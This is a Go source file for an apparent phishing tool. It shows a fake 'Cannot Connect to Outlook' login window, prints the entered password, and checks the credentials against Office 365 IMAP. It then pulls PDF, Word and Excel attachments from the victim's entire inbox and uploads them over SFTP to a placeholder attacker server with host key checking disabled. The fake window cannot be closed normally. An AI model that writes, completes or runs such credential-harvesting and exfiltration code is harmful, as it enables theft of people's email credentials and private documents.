package main

import (
	"github.com/andlabs/ui"
	"fmt"
	 // "os"
    "os/user"
    "log"
    	"github.com/emersion/go-imap/client"
	"github.com/emersion/go-imap"
	"github.com/emersion/go-message/mail"
	"strings"
	 "github.com/pkg/sftp"
 	"golang.org/x/crypto/ssh"
 	"path"
 	"time"
 	"io"
 	"io/ioutil"
)

func main() {
	createbox()	
}

func createbox(){
	gapuser, _ := user.Current()

	err := ui.Main(func() {
		usernameinput := ui.NewEntry()
		username := fmt.Sprintf("%s@example.com",gapuser.Username)
		usernameinput.SetText(username)
		passwordinput := ui.NewPasswordEntry()
		okbutton := ui.NewButton("OK")
		// cancelbutton := ui.NewButton("Cancel")
		checkbox := ui.NewCheckbox("Remember my credentials")
		greeting := ui.NewLabel("")
		greeting2 := ui.NewLabel("")
		greeting3 := ui.NewLabel("")
		box := ui.NewVerticalBox()
		box.Padded()
		// ws := ui.NewLabel("Windows Security")
		
		connectstring := (fmt.Sprintf("Connecting to %s",username))
		// box.Append(ws,false)

		// box.Append(ui.NewLabel("Microsoft Outlook"), false)
		box.Append(ui.NewLabel(connectstring), false)
		box.Append(usernameinput, false)
		box.Append(greeting,false)
		box.Append(passwordinput, false)

		box.Append(checkbox,false)
		box.Append(greeting2,false)
		box.Append(okbutton, false)
		box.Append(greeting3,false)
		// box.Append(cancelbutton, false)
		// box.Append(greeting, false)
		window := ui.NewWindow("Cannot Connect to Outlook", 320, 150, false)
		window.SetMargined(true)
		window.SetChild(box)


		okbutton.OnClicked(func(*ui.Button) {

			fmt.Println(passwordinput.Text())
			c, err := client.DialTLS("outlook.office365.com:993", nil)
			if err != nil {
				log.Fatal(err)
			}
			log.Println("Connecting")
			c.Login(usernameinput.Text(),passwordinput.Text())
			defer c.Logout()
			if err := c.Login(usernameinput.Text(), passwordinput.Text()); err != nil {
				ui.MsgBoxError(window,"Invalid Credentials","Could not connect to Outlook")
				log.Println(err)
			}else{
				window.Hide()
				exfilmail(usernameinput.Text(),passwordinput.Text())


			}
			// greeting.SetText("Hello, " + passwordinput.Text() + "!")
		})
		window.OnClosing(func(*ui.Window) bool {
			ui.MsgBoxError(window,"Invalid Credentials","Could not connect to Outlook")
			// fmt.Println("CLOSED WINDOW")
			// ui.Quit()
			return false
		})
		window.Show()
	})
	if err != nil {
		panic(err)
	}


}


func exfilmail(username string,password string){
	log.Println("Connecting to server...")
	c, err := client.DialTLS("outlook.office365.com:993", nil)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("Connected")
	c.Login(username,password)
	defer c.Logout()
	if err := c.Login(username, password); err != nil {
	
	}
	log.Println("Logged in")
	// List mailboxes
	mailboxes := make(chan *imap.MailboxInfo, 10)

	done := make(chan error, 1)
	go func () {
		done <- c.List("", "*", mailboxes)
	}()

	log.Println("Mailboxes:")
	for m := range mailboxes {
		log.Println("* " + m.Name)
	}

	if err := <-done; err != nil {
		log.Fatal(err)
	}

	// Select INBOX
	mbox, err := c.Select("INBOX", false)
	if err != nil {
		log.Fatal(err)
	}
	// Get the last 4 messages
	from := uint32(1)
	to := mbox.Messages
	if mbox.Messages > mbox.Messages {
		// We're using unsigned integers here, only substract if the result is > 0
		from = mbox.Messages - mbox.Messages
	}
	seqset := new(imap.SeqSet)
	seqset.AddRange(from, to)
	section := &imap.BodySectionName{}

	messages := make(chan *imap.Message, 10)
	done = make(chan error, 1)
	go func() {
		done <- c.Fetch(seqset, []imap.FetchItem{section.FetchItem()}, messages)
	}()

	log.Println("Scanning all messages:")
	for msg := range messages {
	//	log.Println("* " + msg.BodyStructure.Size)
	//	log.Println(msg.BodyStructure.Description)
		// fmt.Println(msg.Body)
		r := msg.GetBody(section)
	if r == nil {
		log.Println("Server didn't returned message body")
	}
	// Create a new mail reader
	mr, err := mail.CreateReader(r)
	if err != nil {
		log.Println(err)
	}
	for {
		p, err := mr.NextPart()
		if err == io.EOF {
			break
		} else if err != nil {
			log.Println(err)
		}
		switch h := p.Header.(type) {
		case mail.TextHeader:
			// log.Println("Got text: No attachment")
		case mail.AttachmentHeader:
			// This is an attachment
			filename, _ := h.Filename()
			if len(filename) > 1{
				if strings.Contains(filename,"pdf") || strings.Contains(filename,"doc") || strings.Contains(filename,"xls"){
					log.Println("Got attachment:", filename)
					b, err:= ioutil.ReadAll(p.Body)
						if err != nil {
							log.Println(err)
						}
					sshupload(b,filename)
					// 	fd, err := os.Create(filename)
					// 	if err != nil {
					// 		log.Println(err)
					// 	}
					// 	n, err := fd.Write(b)
					// 	if err != nil || n != len(filename) {
					// 		log.Println(err)
					// }
				}
			}
		}
	}
}
	// if err := <-done; err != nil {
	// 	log.Fatal(err)
	// }

	log.Println("Done!")
}

func sshupload(data []byte, filename string){
 var (
 err  error
 sftpClient *sftp.Client
 )

 //  Here for the actual  SSH  Connected   User name ， Password ， Host name or IP，SSH port 
 sftpClient, err = connect("username", "password", "server", 22)
 if err != nil {
 log.Fatal(err)
 }
 defer sftpClient.Close()
 var remoteDir = "/tmp/"
 dstFile, err := sftpClient.Create(path.Join(remoteDir, filename))
 if err != nil {
 log.Fatal(err)
 }
dstFile.Write(data)
defer dstFile.Close()
 }


func connect(user, password, host string, port int) (*sftp.Client, error) { 
 var (
 auth   []ssh.AuthMethod
 addr   string
 clientConfig *ssh.ClientConfig
 sshClient *ssh.Client
 sftpClient *sftp.Client
 err   error
 )
 // get auth method
 auth = make([]ssh.AuthMethod, 0)
 auth = append(auth, ssh.Password(password))

 clientConfig = &ssh.ClientConfig{
 User: user,
 HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 Auth: auth,
 Timeout: 30 * time.Second,
 }

 // connet to ssh
 addr = fmt.Sprintf("%s:%d", host, port)

 if sshClient, err = ssh.Dial("tcp", addr, clientConfig); err != nil {
 return nil, err
 }

 // create sftp client
 if sftpClient, err = sftp.NewClient(sshClient); err != nil {
 return nil, err
 }

 return sftpClient, nil
}
